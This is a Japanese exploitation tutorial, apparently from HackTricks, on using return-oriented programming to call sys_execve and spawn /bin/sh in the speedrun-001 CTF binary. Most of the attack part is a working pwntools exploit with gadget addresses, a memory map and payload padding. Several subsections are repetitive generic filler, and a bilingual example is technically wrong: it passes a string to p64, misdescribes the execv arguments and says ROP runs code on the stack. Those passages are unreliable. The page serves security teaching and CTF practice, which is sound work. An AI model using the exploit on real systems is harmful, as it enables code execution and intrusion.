# ROP - sys_execveの呼び出し

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**シスコール**の呼び出しの準備には、次の設定が必要です：

* `rax: 59 sys_execveを指定します`
* `rdi: "/bin/sh"へのポインタを指定します`
* `rsi: 0 引数は渡されません`
* `rdx: 0 環境変数は渡されません`

したがって、基本的には文字列`/bin/sh`をどこかに書き込み、その後で`syscall`を実行する必要があります（スタックを制御するために必要なパディングに注意してください）。

## レジスタの制御

まず、**これらのレジスタを制御する方法**を見つけましょう：
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
これらのアドレスを使用することで、**スタックにコンテンツを書き込み、レジスタにロードすることができます**。

## 文字列の書き込み

### 書き込み可能なメモリ

まず、メモリ内の書き込み可能な場所を見つける必要があります。
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### 文字列の書き込み

次に、このアドレスに任意の内容を書き込む方法を見つける必要があります。
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 ビット

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) は、実行可能なコードの断片（ガジェット）を組み合わせて攻撃を実行する手法です。これは、スタック上のリターンアドレスを制御し、攻撃者が任意のコードを実行できるようにします。

##### システムコールの利用

システムコールは、カーネルの機能を呼び出すためのインターフェースです。攻撃者は、システムコールを利用して特権のある操作を実行することができます。ROP を使用してシステムコールを呼び出すことで、攻撃者は任意のコードを実行できます。

##### execv システムコール

execv システムコールは、新しいプログラムを実行するために使用されます。攻撃者は、ROP を使用して execv システムコールを呼び出すことで、任意のプログラムを実行できます。

##### ROP を使用した execv の呼び出し

ROP を使用して execv システムコールを呼び出すためには、以下の手順を実行する必要があります。

1. execv のアドレスを見つける。
2. execv の引数を設定する。
3. execv を呼び出すためのガジェットを見つける。
4. ROP ペイロードを構築する。
5. ROP ペイロードを実行する。

##### execv のアドレスの探索

execv のアドレスを探すためには、libc ライブラリ内のシンボルテーブルを調査する必要があります。一般的な方法は、libc ライブラリのベースアドレスを見つけ、そのオフセットを使用して execv のアドレスを計算することです。

##### execv の引数の設定

execv の引数は、実行するプログラムのパスと引数の配列です。これらの引数を適切に設定する必要があります。

##### execv を呼び出すためのガジェットの探索

execv を呼び出すためのガジェットを探すためには、バイナリ内の有効なガジェットを見つける必要があります。これらのガジェットは、ret 命令を使用してスタック上のリターンアドレスを制御します。

##### ROP ペイロードの構築

ROP ペイロードは、ガジェットのアドレスと引数の値を組み合わせて構築されます。これにより、execv システムコールが呼び出され、任意のプログラムが実行されます。

##### ROP ペイロードの実行

ROP ペイロードを実行するためには、攻撃者はスタック上にROP チェーンを配置する必要があります。これにより、攻撃者は任意のコードを実行することができます。
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ビット

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) は、スタック上の既存のコード断片（ガジェット）を組み合わせて攻撃者が任意のコードを実行する手法です。これは、データ領域への書き込みや実行権限のないメモリ領域へのジャンプなど、制約のある環境での攻撃に有効です。

ROP チェーンを構築するためには、以下の手順を実行する必要があります。

1. ガジェットのアドレスを特定する
2. ガジェットのアドレスをスタック上に配置する
3. ガジェットのアドレスをスタック上から呼び出す

ROP は、スタック上の既存のコードを利用するため、実行権限のないメモリ領域でも攻撃を実行することができます。

##### システムコールの利用

システムコールは、カーネルの機能を呼び出すためのインターフェースです。攻撃者は、システムコールを利用して特権のある操作を実行することができます。

システムコールを呼び出すためには、以下の手順を実行する必要があります。

1. システムコールの番号を特定する
2. システムコールの引数を設定する
3. システムコールを呼び出す

システムコールを利用することで、攻撃者は特権のある操作を実行することができます。

##### execve システムコール

execve システムコールは、新しいプログラムを実行するためのシステムコールです。攻撃者は、execve システムコールを利用して任意のプログラムを実行することができます。

execve システムコールを呼び出すためには、以下の手順を実行する必要があります。

1. プログラムのパスを指定する
2. コマンドライン引数を設定する
3. 環境変数を設定する
4. execve システムコールを呼び出す

execve システムコールを利用することで、攻撃者は任意のプログラムを実行することができます。
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## 例

The following example demonstrates how to use ROP to execute the `execv` system call in Linux.

以下の例では、ROPを使用してLinuxで`execv`システムコールを実行する方法を示しています。

```python
from pwn import *

# Set up the target process
target = process('/path/to/vulnerable/program')

# Find gadgets using ROPgadget
pop_rdi = 0x000000000040123b  # pop rdi; ret;
pop_rsi_r15 = 0x0000000000401239  # pop rsi; pop r15; ret;
execv_addr = 0x0000000000401030  # address of execv function

# Build the ROP chain
rop_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64('/bin/sh\x00') + p64(0) + p64(execv_addr)

# Send the ROP chain to the target process
target.sendline(rop_chain)

# Interact with the target process
target.interactive()
```

The example above demonstrates a basic ROP chain that uses two gadgets (`pop rdi; ret;` and `pop rsi; pop r15; ret;`) to set up the arguments for the `execv` system call. The address of the `execv` function is obtained using a tool like ROPgadget.

上記の例では、`pop rdi; ret;`と`pop rsi; pop r15; ret;`の2つのガジェットを使用して、`execv`システムコールの引数を設定する基本的なROPチェーンが示されています。`execv`関数のアドレスは、ROPgadgetのようなツールを使用して取得されます。

The ROP chain is built by concatenating the addresses of the gadgets and the arguments for the `execv` system call. In this example, the ROP chain sets the `rdi` register to 0 (which represents the file descriptor for `stdin`), the `rsi` register to the address of the string "/bin/sh\x00" (which represents the command to be executed), and the `r15` register to 0. Finally, the address of the `execv` function is appended to the ROP chain.

ROPチェーンは、ガジェットのアドレスと`execv`システムコールの引数を連結して構築されます。この例では、ROPチェーンは`rdi`レジスタを0（`stdin`のファイルディスクリプタを表す）に設定し、`rsi`レジスタを文字列"/bin/sh\x00"（実行するコマンドを表す）のアドレスに設定し、`r15`レジスタを0に設定します。最後に、`execv`関数のアドレスがROPチェーンに追加されます。

The ROP chain is then sent to the target process, which will execute the `execv` system call with the specified arguments. This will result in the execution of the `/bin/sh` shell, providing an interactive shell to the attacker.

その後、ROPチェーンは指定された引数で`execv`システムコールを実行するターゲットプロセスに送信されます。これにより、攻撃者に対して対話型シェルを提供する`/bin/sh`シェルが実行されます。
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## 参考文献

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
